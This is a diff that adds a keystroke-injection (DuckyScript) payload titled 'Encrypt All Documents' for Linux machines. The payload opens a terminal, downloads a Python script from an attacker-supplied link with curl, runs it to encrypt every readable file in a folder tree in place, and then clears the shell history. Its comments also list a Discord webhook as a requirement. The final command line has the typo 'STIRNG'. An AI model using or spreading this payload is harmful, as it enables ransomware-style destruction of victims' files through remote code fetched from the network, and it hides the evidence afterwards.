@@ -1,0 +1,48 @@
+REM ########################################
+REM #                                      |
+REM # Title        : Encrypt All Documents |
+REM # Author       : Aleff                 |
+REM # Version      : 1.1                   |
+REM # Category     : Execution             |
+REM # Target       : Linux                 |
+REM #                                      |
+REM ########################################
+
+
+REM ATTENTION - BEFORE USING THIS PAYLOAD MAKE SURE YOU UNDERSTAND WHAT IT DOES
+REM 
+REM Script description
+REM
+REM The Python code defines a function "cyp_folder" that encrypts all files in a folder (and its subfolders) using the Fernet encryption algorithm. The function takes two arguments: the path of the folder to be encrypted ("path") and a Fernet object ("fernet") that contains the encryption key.
+REM
+REM Inside the function, the os.walk function is used to obtain a list of all files in the specified folder and its subfolders. For each file found, its full path is created and checked for readability using the os.access function. If the file is not readable, the loop moves on to the next file.
+REM 
+REM The "file" Linux command is then executed to determine if the file is a text file or a directory. If the file is a directory, the "cyp_folder" function is recursively called on the directory.
+REM 
+REM If the file is a text file (or however not a directory), it is opened in binary read mode using the "open" function. The contents of the file are read and then encrypted using the "encrypt" function of the Fernet object.
+REM 
+REM Finally, the file is opened in binary write mode and the encrypted content is written to the file, overwriting the original content.
+REM 
+REM In summary, the code encrypts all files in a folder (and its subfolders) using the Fernet encryption algorithm and overwrites the original content with the encrypted content.
+REM  
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Discord Webhook
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+REM Reply example.com with YOUR LINK. The Payload should be EncryptAllDocumentsScript.py
+DEFINE PAYLOAD example.com
+STRING curl 
+STRING PAYLOAD
+STRING  > script.py
+ENTER
+
+REM It depends by the internet connection, btw 2/3 seconds is a lot for a fiew text line...
+DELAY 2000
+
+STIRNG python3 script.py; history -c; exit;
+ENTER
